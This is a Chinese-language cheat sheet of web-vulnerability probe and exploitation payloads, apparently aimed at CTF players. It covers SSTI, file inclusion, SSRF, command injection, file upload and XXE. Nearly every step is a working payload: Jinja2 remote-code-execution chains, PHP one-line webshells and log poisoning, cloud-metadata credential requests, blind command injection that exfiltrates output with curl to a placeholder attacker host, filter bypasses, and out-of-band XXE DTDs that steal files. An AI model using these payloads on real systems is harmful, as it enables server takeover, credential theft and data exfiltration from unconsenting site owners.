## [probe] 漏洞探测 Payload 速查——遇到功能点先打一发探测 payload，确认漏洞类型再深入。
### [probe-ssti] SSTI 模板注入快速探测 | medium | SSTI;模板注入;探测 | ssti探测;jinja2;twig;7*7
> 一步区分引擎、两步拿 RCE 的探测链

#### 这个条目的作用
页面把你的输入直接拼进模板渲染（不是普通 HTML 转义），模板引擎就可能执行你的表达式。本条目教你 1 分钟确认注入、2 步区分引擎、接着拿 RCE。

#### 前置条件
- 靶机 URL：一个「提交内容后会回显」的功能点（搜索框、留言名、报错页、导出文件名等）
- 工具：浏览器 + curl 即可，不需要额外环境
- 假设你已会：用 curl 发请求、看响应

#### 第 1 步：找到「输入会被渲染」的功能点
操作：浏览页面，凡是你输入的内容能原样出现在响应里（搜索词显示在页面标题、用户名显示在欢迎语）都是候选。
预期结果：找到一个输入点，记下它的回显位置（HTML 正文 / 标签属性 / JS 字符串 / 注释里）。
如果不行：回显位置藏得深，就用 Burp Repeater 手动重放请求观察响应差异。

#### 第 2 步：提交万能探测串 {{7*7}}
操作：把输入改成 {{7*7}} 再提交（搜索框、参数值都试）。
命令或请求：
```txt
{{7*7}}
```
预期结果：响应里出现 49 → 模板注入确认，引擎是 Jinja2 / Twig / Django 系。
如果不行：没反应就换下一组语法逐个试，任意一个出结果就锁定引擎：

| 引擎 | 探测语法 |
|---|---|
| Smarty | {$smarty.version} |
| FreeMarker / JSP EL | ${7*7} |
| Velocity | #set($x=7*7)$x |
| ERB (Ruby) | <%= 7*7 %> |
| Angular | {{7*7}} |

全部无反应：可能被过滤或根本不是模板，看报错信息里有没有模板引擎名（jinja2、twig、freemarker 等）。

#### 第 3 步：区分 Jinja2 与 Twig
操作：提交 {{7*'7'}}。
命令或请求：
```txt
{{7*'7'}}
```
预期结果：返回 7777777 → Jinja2；返回 49 → Twig（两引擎对"字符串 × 数字"语义不同）。
如果不行：{{7*'7'}} 报错也属正常，能跑 {{7*7}} 就可以继续往下走。

#### 第 4 步：确认对象可访问（为 RCE 铺路）
操作：逐个提交这几个探测串，看哪个有输出：
```txt
{{config}}
{{''.__class__}}
{{lipsum}}
{{self.__class__}}
```
预期结果：{{config}} 吐出配置字典 = 注入成功且没有全量黑名单；{{lipsum}} 存在 = 有逃逸入口。
如果不行：点号被过滤时换 attr 过滤器：{{''|attr('__class__')}}。

#### 第 5 步：Jinja2 标准 RCE 链
操作：直接在参数里提交，按顺序试，命中即停：
```txt
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```
预期结果：响应里出现 uid=... 等当前用户信息 → RCE 到手，可换 whoami、cat /flag。
如果不行：三个全被拦就走 subprocess 链，先列子类：
```txt
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```
找到 subprocess.Popen 的下标 N（本地跑同款 python 代码数索引），再打：
```txt
{{ ''.__class__.__mro__[2].__subclasses__()[N]('id',shell=True,stdout=-1).communicate() }}
```
注意不同 Python 版本 __mro__ 下标不同（[1]/[2] 都可能），逐个试。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| {{7*7}} 原样输出 | 不是模板渲染，或引擎语法不同 | 换 ${7*7} / {7*7} / {$smarty.version} 等语法 |
| 爆 500 错误 | 引擎存在但语法被解析出错 | 500 本身说明在解析模板，换正确语法的探测串 |
| 过滤点号 . | 黑名单拦了 __class__ 类链 | 用 |attr() 过滤器、|string、[] 下标替代 |
| 过滤关键字 | 拦了 os / popen / subprocess | 逐层拆：{{lipsum|attr('__globals__')}} 先取字典再取值 |

#### 实战要点
- 探测顺序：{{7*7}} → {{7*'7'}} → {{config}} → RCE 链，任何一步命中就停。
- {{cycler}} 和 {{lipsum}} 是 Jinja2 内置对象，最常没被过滤，优先打。
- 无任何回显（盲 SSTI）时用 os.popen('sleep 5') 测延迟确认。
- 输出被截断就改成外带（发到自己服务器），别死磕页面输出。
- Twig/FreeMarker/Smarty 各有专属 RCE 链（_self.env、freemarker.template.utility.Execute），先确认引擎再查对应专章。

### [probe-lfi] 文件包含 / 任意文件读取探测 | medium | 文件包含;LFI;伪协议;探测 | lfi;rfi;php filter;文件读取
> LFI/RFI 与 php://filter 读源码的标准姿势

#### 这个条目的作用
页面用参数拼文件路径（读哪个页面、加载哪个模板、下载哪个文件），参数就可能被利用来读服务器任意文件甚至执行代码。本条目讲透：探测 → 穿越 → 伪协议读源码 → 执行。

#### 前置条件
- 靶机 URL：一个带文件类参数的请求（?file=index.php 这类）
- 工具：浏览器 / Burp / curl 任选；读 base64 时可用 python3
- 假设你已会：URL 编码、curl 发请求

#### 第 1 步：找文件类参数
操作：翻页面源码或抓包，找值像文件路径的参数。典型参数名：
```txt
file page path include template lang load view doc download
```
判断标准：参数值形如 index.php、about.html、/uploads/xxx.jpg，或改参数值能切换页面内容。
预期结果：锁定一个「值 = 路径」的参数，它就是 LFI 候选入口。
如果不行：先目录扫出常见页面（如 index.php?page=xxx），再回到参数。

#### 第 2 步：基础穿越探测 /etc/passwd
操作：把参数值改成穿越路径提交：
```txt
?file=../../../../etc/passwd
?file=../../../etc/passwd
?file=/etc/passwd
```
预期结果：响应里出现 `root:x:0:0:root:/root:/bin/bash` 之类内容 → LFI 确认，可以直接读文件。
如果不行：页面空白或被转义，进入第 3 步做编码变体轮换。

#### 第 3 步：处理过滤（编码变体轮换）
操作：../ 被过滤时依次试这些写法：
```txt
?file=....//....//....//etc/passwd
?file=..%2f..%2f..%2fetc/passwd
?file=..%252f..%252f..%252fetc/passwd
?file=..%2f..%2f..%2f..%2fetc%2fpasswd
```
预期结果：任一变体出 passwd 内容即绕过成功，还能顺带判断过滤器是单次解码还是双重解码。
如果不行：还是空白就试绝对路径 file=/etc/passwd（很多实现只是简单前缀拼接）。

#### 第 4 步：PHP 伪协议读源码（重点）
操作：先读首页源码确认技术栈，把参数值换成：
```txt
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=config.php
```
预期结果：响应是一段 base64 字符串——这就是源码，先解码再看：
```bash
echo '这里粘贴响应里的base64' | base64 -d
```
如果不行：解码出来能看到 <?php 就说明读到了源码；没有就试 resource=../flag.php。

#### 第 5 步：无伪协议时用 php://input / data:// 执行
操作：确认 allow_url_include 是否开启（试了才知道）：
```bash
# POST 方式，把 PHP 代码放请求体
curl -s http://target/index.php?file=php://input -d '<?php system("id");?>'
# data 协议（GET 也能用）
curl -s "http://target/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8+"
```
预期结果：响应里有命令输出 → 相当于命令执行级 getshell。
如果不行：返回空白说明 allow_url_include=Off，改用第 6 步日志包含兜底。

#### 第 6 步：日志 / 会话包含兜底
操作：先往日志里写马（User-Agent 带上 PHP 马），再包含日志文件：
```bash
curl -s http://target/index.php -A '<?php @eval($_POST["x"]);?>'
```
然后提交包含：
```txt
?file=/var/log/nginx/access.log
?file=/var/log/apache2/access.log
?file=/proc/self/environ
?file=/tmp/sess_<你的PHPSESSID>
```
预期结果：页面出现 PHP 警告或直接执行；随后用 curl 连马：
```bash
curl -s "http://target/index.php?file=/var/log/nginx/access.log" -d 'x=system("id");'
```
如果不行：日志路径不对就换一份；UA 里的引号被转义就用无引号写法或 base64 解码后执行。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 加了 ../ 页面没变化 | 路径被写死，或 ../ 被过滤 | 试编码变体、绝对路径、..;/ |
| 读出来的源码"乱码" | 读到的是被解析执行后的结果 | 用 php://filter 的 base64 编码读 |
| 伪协议全空白 | allow_url_include 关闭 | 走日志包含 / 写文件后包含 |
| 爆 500 错误 | 包含进无效 PHP 代码 | 读源码确认格式，换简洁 payload |

#### 实战要点
- 读源码是第一选择：php://filter + base64，几乎通吃 PHP 题。
- 别忘了解码 base64；读到源码先找 config/db 里的账号密码。
- 穿越深度靠猜：多试 2~5 级 ../，或直接绝对路径。
- RFI（远程包含）需要 allow_url_include，大部分靶场是关的，别死磕。
- /proc/self/environ 和 access.log 是万能兜底，前提是知道路径。

### [probe-ssrf] SSRF 快速探测 | medium | SSRF;内网探测;探测 | ssrf探测;169.254.169.254;gopher
> 确认 SSRF、读文件、打内网的探测链

#### 这个条目的作用
服务器的功能会替你访问一个 URL（抓网页、预览图片、拉取远端资源），URL 参数可控，服务器就变成你的代理：能读本机文件、打内网、摸云元数据。本条目讲确认 → 读文件 → 打内网三步。

#### 前置条件
- 靶机 URL：一个「提交 URL 后服务端去访问」的功能点
- 一个你能收请求的监听地址（本地 nc 或 VPS）
- 假设你已会：nc 监听、curl 基本用法

#### 第 1 步：找 URL 类参数
操作：找「输入网址 / 图片链接 / 远程加载」功能，常见参数名：
```txt
url target link img src dest fetch redirect uri next
```
判断标准：提交一个网址，功能会去抓取（页面出现该网址内容/图片）。
预期结果：锁定一个「值 = URL」的参数。
如果不行：看页面提示（"请输入图片链接"）或抓包看哪个参数被发出去。

#### 第 2 步：本机回环确认存在
操作：让服务器访问 127.0.0.1 的不同端口，对比响应差异：
```txt
?url=http://127.0.0.1:80
?url=http://127.0.0.1:22
?url=http://127.0.0.1:9999
```
预期结果：三个响应内容/报错不同（端口不同、服务不同）→ SSRF 确认。
如果不行：三个响应完全一样，参数可能没用上或被过滤，进入第 3 步外带确认。

#### 第 3 步：外带确认（最稳）
操作：本机起监听，再提交指向自己的 URL：
```bash
nc -lvnp 8888
```
```txt
?url=http://127.0.0.1:8888
?url=http://YOUR_IP:8888/ssrf
```
YOUR_IP 替换成你的监听 IP（靶机必须能访问到）。
预期结果：nc 窗口收到连接请求 → SSRF 实锤，还能看到服务器出口 IP。
如果不行：收不到请求 = 无 SSRF 或出网受限，换功能点再试，别继续浪费时间。

#### 第 4 步：读文件与协议利用
操作：切换 file / dict / gopher 协议：
```txt
?url=file:///etc/passwd
?url=file:///flag
?url=dict://127.0.0.1:6379/info
?url=gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a
```
预期结果：file:// 出 passwd 内容 = 任意文件读取；dict/gopher 有响应 = 能打内网服务（redis 可写 webshell / 公钥）。
如果不行：file:// 被禁就试进制 IP、重定向绕过（见常见错误表）。

#### 第 5 步：云元数据（服务器在云上时）
操作：逐个提交（云厂商不同地址不同）：
```txt
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://100.100.100.200/latest/meta-data/   # 阿里云
?url=http://metadata.google.internal/computeMetadata/v1/   # GCP（可能需要加 Metadata-Flavor: Google 头）
```
预期结果：返回 JSON/XML 云数据 → 可能直接拿到云账号临时凭证（CTF 高分点）。
如果不行：靶场一般不是真云，试不出来就跳过。

#### 第 6 步：内网端口盲探
操作：无回显时用时间差/内容差异判断端口是否存活：
```bash
for p in 80 443 22 3306 6379 8080 9200; do
  curl -s -o /dev/null --connect-timeout 2 "http://target/ssrf?url=http://127.0.0.1:$p" &
done
```
预期结果：某端口响应时间明显不同或内容不同 → 内网该端口存活。
如果不行：全部超时说明出口过滤外连或参数无效，换触发点。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 三个端口响应一样 | 参数没被用于请求 | 换参数名/功能点，或用外带确认 |
| 外带收不到 | 靶机出网受限 / 域名白名单 | 试 DNS 外带：url=http://<你的>.dnslog.cn |
| file:// 被禁 | 协议白名单 | http:// 打内网、进制 IP、重定向绕过 |
| 127.0.0.1 被拦 | IP 黑名单 | 进制/短域名/重定向绕过（见下） |

#### 实战要点
- 先外带确认再深挖，避免在假 SSRF 上浪费时间。
- 云元数据地址要记牢：169.254.169.254（AWS/GCP 通用）、100.100.100.200（阿里云）。
- 绕过 IP 黑名单速查：2130706433、0x7f000001、http://0、http://127.1、@ 与 # 混淆、302 重定向。
- 有域名白名单时优先 DNS 重绑定（第一次解析公网、第二次解析内网）。
- gopher 打 redis 是 SSRF 最高价值利用（写 webshell/写公钥），网上有现成 payload 生成器，别手写。

### [probe-rce] 命令注入快速探测 | medium | 命令注入;RCE;探测 | 命令执行;command injection;rce探测
> 命令注入的分隔符、闭合与无回显判定

#### 这个条目的作用
功能点把你的输入拼进系统命令（ping 一个 IP、导出 zip、查域名），输入里的特殊字符就可能造成任意命令执行。本条目讲：找触发点 → 分隔符验证 → 闭合 → 无回显判定。

#### 前置条件
- 靶机 URL：一个命令类功能点（表单、API 参数）
- 工具：curl / Burp；外带时需要 nc 监听
- 假设你已会：观察页面输出、用 curl 发请求

#### 第 1 步：找命令类触发点
操作：找 ping、traceroute、whois、nslookup、在线下载、导出功能；抓包看参数，常见参数名：
```txt
ip host domain cmd command exec task ping
```
判断标准：参数值会被拼进类似 `ping 1.2.3.4`、`whois xxx.com` 的调用。
预期结果：锁定一个「值会被拼进命令」的参数。

#### 第 2 步：分隔符逐个验证
操作：从最简单的开始，输入一个明显命令，看输出有没有多出内容：
```txt
; id
| id
|| id
&& id
`id`
$(id)
```
预期结果：响应里出现 `uid=...` 的输出 → 命令注入确认。
如果不行：逐个换（有的过滤分号但放行管道）；全部无效再试换行符：
```txt
%0aid
%0a id %0a
```

#### 第 3 步：闭合场景（参数原值占位时）
操作：功能固定了输入格式（如参数是 IP），用闭合写法：
```txt
127.0.0.1;id
127.0.0.1|id
127.0.0.1&&id
127.0.0.1%0aid
127.0.0.1$(id)
`id`127.0.0.1
';ls;#
";ls;#
' ; ls ; '
```
预期结果：任一写法执行成功（输出 id 结果），说明引号被闭合。
如果不行：先确认参数是被引号包着还是裸拼；报错信息里能看到原命令形态最好。

#### 第 4 步：无回显判定（盲执行）
操作：页面完全没输出时，先用时间差确认注入是否成立：
```txt
;sleep 5
%0asleep 5
```
预期结果：请求等了约 5 秒才返回 → 命令在后台执行，只是不回显。
如果不行：sleep 被禁就换 `;ping -c 5 127.0.0.1`；仍无延迟说明注入不成立。

#### 第 5 步：盲执行拿结果（外带 / 写文件）
操作：把命令输出发到自己监听的端口：
```bash
nc -lvnp 8080
```
```txt
;curl http://YOUR_IP:8080/$(whoami)
;wget http://YOUR_IP:8080/$(cat /flag)
;curl http://YOUR_IP:8080/$(cat /flag|base64)
```
预期结果：nc 收到请求，URL 路径里带着命令输出。
如果不行：curl/wget 都不存在，就写文件再配合任意文件读取/包含：
```txt
;echo $(id) > /tmp/x.txt
;ls / > /tmp/x.txt
```

#### 第 6 步：空格 / 特殊字符过滤绕过
操作：命令能执行但"空格"被过滤时：
```txt
${IFS}id
{cat,/etc/passwd}
cat${IFS}/etc/passwd
id%09
cat</etc/passwd
echo$IFS'Y2F0IC9ldGMvcGFzc3dk'|base64$IFS-d|sh
```
预期结果：绕过空格限制命令照常执行；命令名也被过滤时，把整条命令 base64 编码再解码执行：
```bash
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh
```
如果不行：字符级过滤就试大小写、双写（c''at、c\at）、变量拼接。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 输入 ;id 原样输出 | 参数被引号包裹 | 先闭合引号：';id;' 或 ";id;# |
| 所有分隔符无效 | 黑名单拦了 ; \| & | 优先 %0a 换行、$( )、反引号 |
| 命令执行但无输出 | 回显被丢弃（盲执行） | sleep 确认 → 外带 / 写文件 |
| 输出被截断 | 只回显前几行 | 用 tail，或重定向到文件再读 |

#### 实战要点
- 探测顺序：;id → | id → %0aid → $(id)，命中即停。
- HTTP 参数里 %0a（换行）最稳，常不过滤，优先试。
- 无回显 ≠ 无注入：sleep / 外带是标准判定法。
- $( ) 比反引号更不易被过滤，优先用。
- 注入成功先看 whoami，再决定反弹 shell 还是直接读 flag。

### [probe-upload] 文件上传快速探测 | medium | 文件上传;getshell;探测 | upload绕过;上传检测链
> 按黑名单→内容→白名单的绕过顺序测试上传点

#### 这个条目的作用
上传功能（头像、附件、图片）让你往服务器写文件，如果校验能被绕过，就能传 webshell 直接控制服务器。本条目按「黑名单 → 内容 → 白名单 → 解析漏洞」的顺序教你把每个上传点测穿。

#### 前置条件
- 靶机 URL：一个上传入口（表单或接口）
- 工具：Burp Suite（改包）/ 浏览器；做图片马时用 copy 或 exiftool
- 假设你已会：抓包改包、蚁剑/curl 基本使用

#### 第 1 步：直接传 webshell（最快路径）
操作：上传一个标准一句话，文件名 shell.php 直接传：
```php
<?php @eval($_POST['x']);?>
```
预期结果：上传成功且能访问执行 → 直接 getshell，下面全部跳过。
如果不行：提示"不允许的后缀"被拦 → 进入第 2 步黑名单绕过。

#### 第 2 步：黑名单后缀绕过
操作：逐个换同义后缀和变形（PHP 环境可执行的）：
```txt
shell.php5  shell.phtml  shell.pht  shell.php3  shell.php4  shell.phar
shell.PhP   shell.pphphp        # 大小写 / 双写
shell.php.  shell.php::$DATA    # 空格/点/ADS 结尾
shell.php%00.jpg                # 旧版本空字节截断
```
预期结果：某个后缀上传成功，访问对应 URL 能执行 PHP。
如果不行：全被拦说明不是简单黑名单，进入第 3 步内容检测。

#### 第 3 步：内容检测绕过（图片马）
操作：把马藏进合法图片，绕过文件头校验：
```bash
# Windows
copy /b a.jpg + shell.php s.jpg
# Linux
cat a.jpg shell.php > s.jpg
# 或直接塞 EXIF 注释
exiftool -Comment='<?php @eval($_POST["x"]);?>' a.jpg
```
配合把文件名改成 s.jpg 上传；若被二次渲染剥离，用「二次渲染马生成器」找渲染前后不变的字节块插马。
预期结果：上传通过，页面能预览图片（说明内容合法），再配合包含/解析漏洞执行。
如果不行：还有前端校验 → 直接抓包改包绕过（前端校验根本不看）。

#### 第 4 步：白名单 / MIME 伪装
操作：文件名改合法后缀（.jpg），请求头里 MIME 也改成图片：
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="shell.jpg"
Content-Type: image/jpeg

<?php @eval($_POST['x']);?>
------x--
```
预期结果：后端只查扩展名/Content-Type 就放行；但 shell.jpg 要执行需要配合第 5 步解析漏洞。
如果不行：白名单 + 内容重写都拦 → 试解析漏洞，见第 5 步。

#### 第 5 步：解析漏洞（白名单后缀也能打）
操作：按服务器类型试：
```txt
shell.php.jpg      # Apache 多后缀：匹配最后一个 .jpg 失败时回溯执行 php
.htaccess          # Apache：AddType application/x-httpd-php .jpg
.user.ini          # PHP-FPM：auto_prepend_file=a.png
shell.jpg/.php     # Nginx 旧版畸形解析
shell.php%00.jpg   # IIS 分号/空字节截断
```
预期结果：jpg 等其他后缀文件被当 PHP 解析执行。
如果不行：以上全无效 → 环境可能没有解析漏洞，上传点价值降低，进入第 6 步确认文件位置留作他用。

#### 第 6 步：快速验证访问路径并连接
操作：上传成功后猜目录并逐个访问：
```bash
for d in upload uploads files static img images; do
  curl -s -o /dev/null -w '%{http_code} ' http://target/$d/shell.php; echo; done
```
预期结果：命中 200 的目录就是马的位置，用蚁剑连接或直接：
```bash
curl -s http://target/upload/shell.php -d 'x=system("id");'
```
如果不行：全 404 → 目录名不可预测，看上传响应返回的路径 / Location 头 / 时间戳目录（2024/12/31 这种格式）。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 上传成功但访问 404 | 目录猜错 / 文件名被改名 | 看响应返回路径、时间戳爆破 |
| 后缀被自动改 | 黑名单替换（php→空） | 双写 pphphp、大小写、换同义后缀 |
| 传上去不执行 | 目录无执行权限 | 换目录；配合 LFI 包含执行 |
| 图片马无效 | 被二次渲染剥离 | 用二次渲染工具插不变字节块 |

#### 实战要点
- 上传后立刻访问确认「路径 + 可执行」，别等到最后。
- 前端校验不构成防御，抓包改包直接过。
- 图片马本身不能执行，必须配合 LFI、解析漏洞或 .htaccess。
- .htaccess / .user.ini 是低权限也能打的王牌，优先试。
- 目录不可预测时留意响应体、Location 头、时间戳规律。

### [probe-xxe] XXE 快速探测 | medium | XXE;XML;探测 | xxe探测;外部实体;blind xxe
> XML 解析入口的 XXE 验证与利用

#### 这个条目的作用
功能点解析你提交的 XML（登录、SOAP、导入、svg/docx 上传），XML 里就能声明"外部实体"让解析器替你去读文件、访问内网。本条目讲：找入口 → 有回显读文件 → 盲 XXE 带外。

#### 前置条件
- 靶机 URL：一个会解析 XML 的入口（Content-Type: application/xml 的接口、上传 svg/docx/excel 的地方）
- 一个你能监听收请求的地址（nc / VPS）
- 假设你已会：改请求头、nc 监听

#### 第 1 步：找 XML 解析入口
操作：在 Burp 里把请求的 Content-Type 改成 application/xml、body 改成 XML，看是否被正常解析：
```http
POST /login HTTP/1.1
Host: target
Content-Type: application/xml

<user><name>admin</name></user>
```
预期结果：页面按这个 XML 数据正常响应（没报"格式错误"）→ 入口可用。
其他入口：SOAP 接口、RSS 导入、svg 上传、docx 上传（本质是 zip 包内含 XML）、任意接受 XML body 的接口。
如果不行：400/500 报错也照做，报错里带 XML 解析器关键字（org.xml、libxml、DOM）同样算入口证据。

#### 第 2 步：有回显读文件
操作：body 换成本文件读取 payload：
```xml
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>
<root>&e;</root>
```
预期结果：响应里出现 `root:x:0:0...` → XXE 确认 + 任意文件读取到手。
如果不行：&e; 原样输出或没输出 → 外部实体被禁或盲 XXE，跳到第 4 步。

#### 第 3 步：读 PHP 源码（配合 filter）
操作：读源码时用 base64 编码防解析报错：
```xml
<!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=flag.php">]>
<root>&e;</root>
```
预期结果：响应是一段 base64，解码即源码。
如果不行：同样无输出 → 走盲 XXE 流程（第 4 步）。

#### 第 4 步：盲 XXE 探测（让解析器访问你）
操作：本机起监听，提交外带 payload：
```bash
nc -lvnp 8080
```
```xml
<!DOCTYPE x [<!ENTITY e SYSTEM "http://YOUR_IP:8080/xxe">]>
<root>&e;</root>
```
YOUR_IP 替换成靶机可达的你的 IP。
预期结果：nc 收到 GET /xxe 请求 → 解析器在执行外部实体 → XXE 实锤（即使页面无回显）。
如果不行：收不到 → 出网受限或实体被禁，试 xinclude 绕过（见常见错误表）。

#### 第 5 步：盲 XXE 带外读文件（经典外带 DTD）
操作：先在你自己服务器放恶意 DTD（evil.dtd）：
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR_IP:8080/?%file;'>">
%all;
```
靶机提交：
```xml
<!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://YOUR_IP:8080/evil.dtd"> %dtd;]>
<root/>
```
预期结果：nc 收到 `GET /?root:x:0:0:...` 这样的请求，URL 参数里就是文件内容。
如果不行：文件内容含特殊字符会弄坏 URL，把 evil.dtd 里的 file:// 换成：
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=flag.php">
```
base64 后不含特殊字符，外带就稳定了。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| &e; 原样输出 | 实体被禁 / 未解析 | 换参数实体、xinclude、检查 Content-Type |
| 页面无任何变化 | 盲 XXE | 外带 DTD：让解析器访问你的 nc |
| 外带收不到 | 出网受限 / IP 被拦 | 换 DNS 外带（xx.dnslog.cn） |
| 特殊字符破坏外带 | 文件内容有 & / 空格 | 用 php://filter base64 后再带外 |
| 报错"解析失败" | 语法/编码问题 | 检查 DOCTYPE 位置（必须在根元素之前） |

#### 实战要点
- 先改 Content-Type 为 application/xml 再测，很多接口只是没做 XML 解析。
- svg / docx / excel 上传是 XXE 高频入口，把文件内容换成 payload 上传即可。
- 有回显直接 file:// 读 /etc/passwd；无回显一律走「自己的服务器 + nc 外带」。
- 读二进制/特殊字符文件用 php://filter base64。
- expect://id 可 RCE（需 php expect 扩展）；file 协议被禁时试 http:// 或 /proc/self/environ。